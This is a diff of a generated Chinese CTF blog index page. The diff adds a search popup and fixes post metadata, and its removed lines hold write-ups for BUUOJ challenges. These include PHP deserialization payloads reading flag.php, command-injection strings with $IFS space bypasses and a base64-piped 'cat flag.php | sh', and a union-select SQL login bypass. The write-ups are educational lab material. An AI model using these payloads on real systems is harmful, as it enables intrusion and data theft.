@@ -19,7 +19,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="The best way to know your strength is to fight">
@@ -104,6 +104,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -128,11 +129,38 @@
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
 
 </div>
     </header>
@@ -151,7 +179,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/3KEV53Z/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -165,7 +193,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">联系方式|会下雪的晴天</a>
+            <a href="/2020/3KEV53Z/" class="post-title-link" itemprop="url">联系方式|会下雪的晴天</a>
         </h2>
 
         <div class="post-meta">
@@ -191,14 +219,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>80</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -230,7 +258,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/1Q4RCR8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -244,7 +272,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">Hello World</a>
+            <a href="/2020/1Q4RCR8/" class="post-title-link" itemprop="url">buuoj [网鼎杯 2020 青龙组] （持续更新）</a>
         </h2>
 
         <div class="post-meta">
@@ -254,15 +282,24 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-09-30 08:53:59" itemprop="dateCreated datePublished" datetime="2020-09-30T08:53:59+08:00">2020-09-30</time>
+              <time title="创建时间：2020-09-23 08:56:45" itemprop="dateCreated datePublished" datetime="2020-09-23T08:56:45+08:00">2020-09-23</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-27 23:30:59" itemprop="dateModified" datetime="2020-09-27T23:30:59+08:00">2020-09-27</time>
+                <time title="修改时间：2020-09-30 09:32:03" itemprop="dateModified" datetime="2020-09-30T09:32:03+08:00">2020-09-30</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
+                </span>
+            </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -270,14 +307,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>2.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -289,10 +326,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+          <blockquote>
+<p>复现地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a><br>拖了这么久才看网鼎杯。。这就是菜的原因吧<br>20-9-22 -&gt; 20-</p>
+</blockquote>
+<!-- TOC -->
+
+<ul>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</a></li>
+</ul>
+<!-- /TOC -->
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2020/undefined/#more" rel="contents">
+              <a class="btn" href="/2020/1Q4RCR8/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -316,7 +361,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/K4H6SZ/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -330,121 +375,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">buuoj [网鼎杯 2020 青龙组] （持续更新）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-09-23 08:56:45" itemprop="dateCreated datePublished" datetime="2020-09-23T08:56:45+08:00">2020-09-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:25" itemprop="dateModified" datetime="2020-09-28T22:07:25+08:00">2020-09-28</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <a id="more"></a>
-
-<blockquote>
-<p>复现地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a><br>拖了这么久才看网鼎杯。。这就是菜的原因吧<br>20-9-22 -&gt; 20-</p>
-</blockquote>
-<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
-<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><blockquote>
-<p>知识点：代码审计，反序列化</p>
-</blockquote>
-<p>打开就是代码审计</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>分析源码，==is_valid()== 函数只能让你使用下列字符，然后咋做这个题呢？<br>类里面的==read()==可以被控制，去读取flag.php<br><img src="https://img-blog.csdnimg.cn/20200922222158892.png#pic_center" alt="在这里插入图片描述"></p>
-<blockquote>
-<p>不了解反序列化的童鞋可以看看这个：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674">https://xz.aliyun.com/t/3674</a></p>
-</blockquote>
-<p>反序列化的时候由于类变量是protected，而protected属性在序列化后会变成不可见字符（\00，此字符会截断字符串，导致payload无法使用），导致不能绕过==is_valid()==<br>绕过方法：</p>
-<ul>
-<li><p>将序列化后的小写==s== 变为大写==S== ，使其后面字符支持16进制<br>具体可以这样<img src="https://img-blog.csdnimg.cn/20200922230706662.png#pic_center" alt="在这里插入图片描述"></p>
-</li>
-<li><p>PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过</p>
-</li>
-</ul>
-<p>再者，==__destruct()== 里面<code>$this-&gt;op === &quot;2&quot;</code>是强比较，==process()== 里面是弱比较。所以可以使<code>op=2</code>，int型的，就可以绕过析构函数<br>然后就可以用伪协议读flag</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">public</span> $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">		<span class="keyword">public</span> $content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">	<span class="keyword">echo</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200922225503877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>或者直接写flag.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">public</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">		<span class="keyword">public</span> $content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">	<span class="keyword">echo</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200922225621774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/undefined/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/xiaoxin.jpg">
-      <meta itemprop="name" content="yq1ng">
-      <meta itemprop="description" content="The best way to know your strength is to fight">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="会下雪的晴天">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/undefined/" class="post-title-link" itemprop="url">BUUOJ-[GXYCTF2019]-WEB-WP</a>
+            <a href="/2020/K4H6SZ/" class="post-title-link" itemprop="url">BUUOJ-[GXYCTF2019]-WEB-WP</a>
         </h2>
 
         <div class="post-meta">
@@ -461,7 +392,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-28 22:07:26" itemprop="dateModified" datetime="2020-09-28T22:07:26+08:00">2020-09-28</time>
+                <time title="修改时间：2020-09-30 09:32:39" itemprop="dateModified" datetime="2020-09-30T09:32:39+08:00">2020-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -479,14 +410,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span></span>
+              <span>7.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>NaN:aN</span>
+              <span>13 分钟</span>
             </span>
 
         </div>
@@ -498,105 +429,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <a id="more"></a>
-
-<blockquote>
+          <blockquote>
 <p>平台地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
 </blockquote>
-<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
-<hr>
-<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><blockquote>
-<p>知识点：RCE，空格及过滤的一些基本绕过</p>
-</blockquote>
-<p>提示GET ip，应该是RCE了，ls看看有啥<br><img src="https://img-blog.csdnimg.cn/20200912163953754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020091216431176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>尝试cat一下，发现过滤了空格，绕过一下，过滤了flag，哈哈看来不是这么简单啊，读一下源码吧</p>
-<blockquote>
-<p>空格绕过可以用这些字符：<code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS、$IFS$1 等</code></p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200912164337702.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020091216472176.png#pic_center" alt="在这里插入图片描述"><br>试了试好像只有<code>$IFS$9</code>可以用，过滤了挺多东西哈，不过解法还是挺多的，说两个常用的<br><img src="https://img-blog.csdnimg.cn/20200912165448354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li>内联执行<code>?ip=127.0.0.1;cat$IFS$9`ls` </code>这个我也忘了看的那个大佬的wp了，感觉是奇淫技巧，就记下来了<blockquote>
-<p>何为内联？反引号在linux作用是什么?<br>反引号的作用是命令替换，shell可以先执行``中的命令，将输出结果暂时保存，在适当的地方输出。这就是内联</p>
-</blockquote>
-</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20200912170018615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li>拼接字符<code>?ip=127.0.0.1;a=lag;b=f;cat$IFS$b$a.php</code><br>注意，拼接时前面的赋值不能按flag的顺序赋值，如<code>a=f;b=lag</code>等。因为index.php的源码中有这么一句==<code>if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))</code>这一句的意思就是判断有无按flag顺序出现的字符串<br><img src="https://img-blog.csdnimg.cn/20200912191213921.png#pic_center" alt="在这里插入图片描述"></li>
-<li>其他还有将命令进行base64编码，然后在终端里解码（<code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><br>）等等方法</li>
-</ul>
-<hr>
-<h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><blockquote>
-<p>知识点：md5密码查询的绕过</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200912192115422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进去随手看看了源码（web手打开网站必做的事），发现有个==search.php==，点进去，看着是base家族的，base64解密失败，base32解密再64解密出了sql<br><img src="https://img-blog.csdnimg.cn/20200912192218227.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912193238144.png#pic_center" alt="在这里插入图片描述"><br>那就是从usrname下手了，查查字段，试了下，user在第二列<br><img src="https://img-blog.csdnimg.cn/20200912195612924.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912195759737.png#pic_center" alt="在这里插入图片描述"><br>常规注入似乎不得行，看了看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/12355035.html">大佬的博客</a>发现这题考的是md5绕过，赵总没放提示，绕过md5可以用联合查询生成的虚拟表，将我们联合查询的东西插到结果中去，如下图<br><img src="https://img-blog.csdnimg.cn/20200912200046916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这样就能构造payload了<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code>,后面的md5值就是123</p>
